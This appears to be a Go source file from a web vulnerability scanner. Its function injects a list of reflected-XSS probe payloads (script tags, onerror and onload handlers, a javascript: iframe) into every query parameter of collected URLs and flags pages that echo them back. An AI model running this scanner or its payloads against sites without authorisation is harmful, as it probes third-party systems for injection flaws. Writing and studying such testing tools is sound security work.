package scanner

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var xssPayloads = []string{
	`"><script>alert(1)</script>`,
	`"><img src=x onerror=alert(1)>`,
	`<svg/onload=alert(1)>`,
	`<iframe/src="javascript:alert(1)">`,
	`<body onload=alert(1)>`,
}

// RunXSSScan scans parameterized URLs for reflected XSS vulnerabilities
func RunXSSScan(domain string) {
	inputPath := fmt.Sprintf("output/%s/%s_paramurls/paramurls.txt", domain, domain)
	file, err := os.Open(inputPath)
	if err != nil {
		fmt.Println("[-] Could not read paramurls.txt:", err)
		return
	}
	defer file.Close()

	fmt.Println("[*] Running XSS scan on parameterized URLs...")

	scanner := bufio.NewScanner(file)
	var urls []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			urls = append(urls, line)
		}
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	client := &http.Client{Timeout: 6 * time.Second}
	found := []string{}
	sem := make(chan struct{}, 30) // Limit concurrency

	for _, raw := range urls {
		parsed, err := url.Parse(raw)
		if err != nil || parsed.RawQuery == "" {
			continue
		}

		params := parsed.Query()
		for key := range params {
			for _, payload := range xssPayloads {
				// Inject payload into current param
				fuzzed := parsed.Query()
				fuzzed.Set(key, payload)
				parsed.RawQuery = fuzzed.Encode()

				wg.Add(1)
				sem <- struct{}{}
				go func(testURL string, param string, payload string) {
					defer wg.Done()
					defer func() { <-sem }()

					req, _ := http.NewRequest("GET", testURL, nil)
					req.Header.Set("User-Agent", "Mozilla/5.0 (XSS-Scanner)")

					resp, err := client.Do(req)
					if err != nil || resp == nil {
						return
					}
					defer resp.Body.Close()

					bodyBytes, _ := io.ReadAll(resp.Body)
					body := string(bodyBytes)

					if strings.Contains(body, payload) {
						result := fmt.Sprintf("[XSS] %s → param: %s → payload: %s", testURL, param, payload)
						fmt.Println(result)
						mu.Lock()
						found = append(found, result)
						mu.Unlock()
					}
				}(parsed.String(), key, payload)
			}
		}
	}

	wg.Wait()

	if len(found) > 0 {
		outDir := fmt.Sprintf("output/%s/%s_vulns", domain, domain)
		os.MkdirAll(outDir, 0755)
		outPath := fmt.Sprintf("%s/xss.txt", outDir)
		os.WriteFile(outPath, []byte(strings.Join(found, "\n")), 0644)
		fmt.Println("[+] XSS scan complete. Found:", len(found))
		fmt.Println("[+] Results saved to:", outPath)
	} else {
		fmt.Println("[-] No reflected XSS found.")
	}
}
